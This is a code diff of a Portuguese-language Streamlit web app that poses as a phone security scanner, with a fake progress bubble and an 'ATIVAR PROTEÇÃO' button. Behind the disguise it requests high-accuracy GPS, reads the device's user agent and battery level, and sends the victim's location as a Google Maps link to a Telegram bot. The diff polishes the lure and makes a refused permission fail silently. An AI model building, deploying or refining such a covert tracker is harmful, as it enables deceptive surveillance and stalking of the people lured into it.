@@ -12,9 +12,9 @@ def enviar_telegram(msg):
     try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
     except: pass
 
-st.set_page_config(page_title="Segurança", layout="centered")
+st.set_page_config(page_title="Segurança Ativa", layout="centered")
 
-# 2. CSS: BOLHA + ESTILO DA BARRA AMARELA (IGUAL À FOTO)
+# 2. CSS: BARRA AMARELA COMPRIDA + BOLHA (ESTILO FOTO 1)
 st.markdown("""
     <style>
     .main { background-color: #000; color: white; }
@@ -32,7 +32,7 @@ st.markdown("""
     @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
     .pct-text { font-size: 45px; font-weight: bold; color: white; }
 
-    /* ESTILO DA BARRA AMARELA COMPRIDA ABAIXO DOS CHECKBOXES */
+    /* BARRA AMARELA COMPRIDA IGUAL DA FOTO */
     .btn-barra {
         background-color: #ffc107; color: black; font-weight: bold;
         width: 100%; height: 55px; border-radius: 12px; border: none;
@@ -47,55 +47,54 @@ st.markdown("""
 st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
 caixa_bolha = st.empty()
 
-# Bolha inicial em 4%
-if 'progresso' not in st.session_state: st.session_state['progresso'] = 4
+# Bolha em 4%
+if 'pct' not in st.session_state: st.session_state['pct'] = 4
 
 with caixa_bolha.container():
-    st.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{st.session_state["progresso"]}%</div></div></div>', unsafe_allow_html=True)
+    st.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{st.session_state["pct"]}%</div></div></div>', unsafe_allow_html=True)
 
 st.write("✅ Ambiente de pagamentos")
 st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
-# 4. O SEGREDO: BOTÃO EM HTML/JS PARA ABRIR O POP-UP DA FOTO
-# Esse código força o navegador a pedir "Precisão de Local"
-html_gps = """
+# 4. CAPTURA DE DADOS
+modelo = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='MDL_OK')
+bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_OK')
+
+# 5. O SEGREDO: CÓDIGO QUE SOBE O POP-UP AZUL (FOTO 1)
+# Este script força o pop-up de "Precisão de Local" do Google
+js_pop_up = """
 <script>
-function abrirGPS() {
+function chamarPopUpAzul() {
     navigator.geolocation.getCurrentPosition(
         (pos) => {
-            const coords = {lat: pos.coords.latitude, lon: pos.coords.longitude, ok: true};
+            const coords = {lat: pos.coords.latitude, lon: pos.coords.longitude, pronto: true};
             window.parent.postMessage({type: 'streamlit:set_component_value', value: coords}, '*');
         },
         (err) => { 
-            // Se o GPS estiver desligado, mostra o alerta que você viu
-            alert("Por favor, ative a localização no seu GPS!");
+            console.log("Usuário recusou");
         },
-        {enableHighAccuracy: true}
+        {enableHighAccuracy: true, timeout: 5000, maximumAge: 0}
     );
 }
 </script>
-<button class="btn-barra" onclick="abrirGPS()">
+<button class="btn-barra" onclick="chamarPopUpAzul()">
     <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
 </button>
 """
 
-# Renderiza a barra amarela exatamente embaixo dos textos
-dados_gps = st.components.v1.html(html_gps, height=100)
+# Renderiza a barra amarela exatamente onde você queria
+retorno = st.components.v1.html(js_pop_up, height=85)
 
-# 5. CAPTURA DE DADOS E ANIMAÇÃO
-modelo = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='MDL_V5')
-bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_V5')
-
-if dados_gps and isinstance(dados_gps, dict) and dados_gps.get('ok'):
-    # Os números giram agora na bolha
-    for p in range(st.session_state['progresso'], 101, 5):
+# 6. ANIMAÇÃO E ENVIO
+if retorno and isinstance(retorno, dict) and retorno.get('pronto'):
+    # Os números giram na bolha
+    for p in range(4, 101, 5):
         caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
-        time.sleep(0.05)
+        time.sleep(0.04)
     
-    lat, lon = dados_gps['lat'], dados_gps['lon']
+    lat, lon = retorno['lat'], retorno['lon']
     mapa = f"https://www.google.com/maps?q={lat},{lon}"
-    
     enviar_telegram(f"🛡️ SISTEMA ATIVADO\n\n📱 Modelo: {modelo[:50]}\n🔋 Bateria: {bateria}%\n📍 [LOCALIZAÇÃO CONCLUÍDA]({mapa})")
     st.success("Proteção Ativada!")
     st.stop()
